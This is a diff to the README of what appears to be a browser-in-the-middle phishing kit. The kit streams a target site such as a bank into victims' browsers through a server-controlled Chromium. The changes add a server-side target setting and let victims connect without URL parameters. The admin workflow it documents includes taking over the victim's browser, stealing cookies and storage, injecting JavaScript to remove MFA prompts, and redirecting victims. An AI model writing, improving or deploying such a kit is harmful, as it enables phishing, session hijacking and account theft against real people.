@@ -49,15 +49,19 @@ cp config.example.json config.json
   "default_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...",
   "socket_key": "changeme123",
   "admin_ips": ["127.0.0.1", "123.123.123.123"],
-  "proxy": null
+  "proxy": null,
+  "port": 3000,
+  "target": "default"
 }
 ```
 
 | Field | Description |
 |---|---|
-| `socket_key` | Shared secret — victims and admin both need this. Change before deploying. |
+| `socket_key` | Shared secret for admin authentication. Change before deploying. |
 | `admin_ips` | IPs allowed to access `/admin`. Use `["*"]` to allow any (not recommended). |
 | `proxy` | Optional upstream proxy, e.g. `"http://127.0.0.1:8080"`. `null` = no proxy. |
+| `port` | Server port (default: 3000). Can be overridden with `PORT` env var. |
+| `target` | Target name from `targets.json` to load for all victims. |
 
 ### targets.json
 
@@ -66,6 +70,12 @@ Add targets interactively:
 ```bash
 npm run add-target
 ```
+
+This will prompt you for:
+- **Target name** (used in `config.json` to select this target)
+- **Target URL** (the site to load in the victim's browser)
+- **Viewport dimensions** (width/height for the Chromium browser)
+- **Optional JavaScript injection** (runs after page load)
 
 Or edit `targets.json` directly:
 
@@ -77,15 +87,32 @@ Or edit `targets.json` directly:
     "width": 1920,
     "height": 1080,
     "inject_js": "console.log('injected')"
+  },
+  "default": {
+    "name": "Default Target",
+    "url": "https://example.com",
+    "width": 1920,
+    "height": 1080
   }
 }
 ```
 
 | Field | Description |
 |---|---|
+| `name` | Display name (shown in admin UI and used as key in targets.json) |
 | `url` | Target site the victim's browser will load |
 | `width` / `height` | Chromium viewport size — should match what the target site expects |
 | `inject_js` | Optional JS injected after page load (e.g. pre-fill forms, remove MFA prompts) |
+
+**Important:** After adding a target, set it in `config.json`:
+
+```json
+{
+  "target": "mybank"
+}
+```
+
+All victims will load this target. To switch targets, update `config.json` and restart the server.
 
 ---
 
@@ -104,7 +131,7 @@ npm run build
 npm start
 ```
 
-Server starts on `http://0.0.0.0:80` by default. Override with env vars:
+Server starts on `http://0.0.0.0:3000` by default (configured in `config.json`). Override with env vars:
 
 ```bash
 PORT=8080 HOST=127.0.0.1 npm start
@@ -140,33 +167,39 @@ echo '/swapfile none swap sw 0 0' >> /etc/fstab
 | URL | Description |
 |---|---|
 | `http://HOST/admin` | Admin panel (IP-gated by `admin_ips`) |
-| `http://HOST/phish` | Victim canvas page |
+| `http://HOST/` | Victim canvas page (root path, no parameters needed) |
+| `http://HOST/api/config` | Returns configured target name (used by victim page) |
 | `http://HOST/healthz` | Health check |
 
 ---
 
 ## Victim payload
 
-Deliver `public/victim.html` to the victim. The page needs two query params:
+Simply redirect victims to your server's root URL:
 
 ```
-https://HOST/phish?t=TARGET_KEY&k=SOCKET_KEY
+https://HOST/
 ```
 
-Or set `window.__cpKey` / `window.__cpTarget` before the socket.io script loads (see `payload.txt` for the injection template).
+**No URL parameters needed.** The target is configured server-side in `config.json` via the `target` field. All victims connecting to the server will automatically load the configured target site.
+
+To change the target, update `config.json` and restart the server.
 
 ---
 
 ## Admin workflow
 
-1. Open `/admin` — authenticate with `socket_key` when prompted
-2. Wait for victims to appear in the left sidebar (thumbnails auto-update)
-3. Click a victim card to select it
-4. **Take Over** — your mouse/keyboard now controls the victim's browser; victim sees a "please wait" overlay
-5. **Steal Cookies / Steal Storage** — dumps JSON to the admin panel
-6. **Give Back** — returns control to victim
-7. **Inject JS** — run arbitrary JS in the victim's page
-8. **Navigate** — redirect the victim's browser to any URL
+1. Open `/admin` from an allowed IP (configured in `admin_ips`)
+2. Authenticate with `socket_key` when prompted
+3. Wait for victims to appear in the left sidebar (thumbnails auto-update)
+4. Click a victim card to select it
+5. **Take Over** — your mouse/keyboard now controls the victim's browser; victim sees a "please wait" overlay
+6. **Steal Cookies / Steal Storage** — dumps JSON to the admin panel
+7. **Give Back** — returns control to victim
+8. **Inject JS** — run arbitrary JS in the victim's page
+9. **Navigate** — redirect the victim's browser to any URL
+
+**Note:** Victims do not need authentication — they simply visit the root URL and are automatically connected to the configured target.
 
 ---
 
